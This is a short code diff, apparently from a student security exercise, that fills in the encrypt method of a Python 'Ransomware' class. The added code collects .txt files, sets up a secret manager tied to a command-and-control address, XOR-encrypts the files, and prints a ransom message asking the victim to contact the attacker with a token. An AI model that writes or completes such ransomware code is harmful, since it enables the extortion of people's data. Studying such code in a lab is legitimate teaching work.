@@ -45,14 +45,31 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter: str) -> list:
-        # return all files matching the filter
+        # return all files matching the filter, excluding symlinks
         base_path = Path(".")
-        matching_files = [str(file.absolute()) for file in base_path.rglob(filter)]
+        matching_files = [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
         return matching_files
 
+
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # Lister les fichiers txt
+        files_to_encrypt = self.get_files("*.txt")
+
+        # Créer le SecretManager
+        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
+
+            # load the file
+        plain = ""
+        # Appeler setup()
+        secret_manager.setup()
+
+
+        # Chiffrer les fichiers
+        secret_manager.xorfiles(files_to_encrypt)
+
+        # Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex.
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
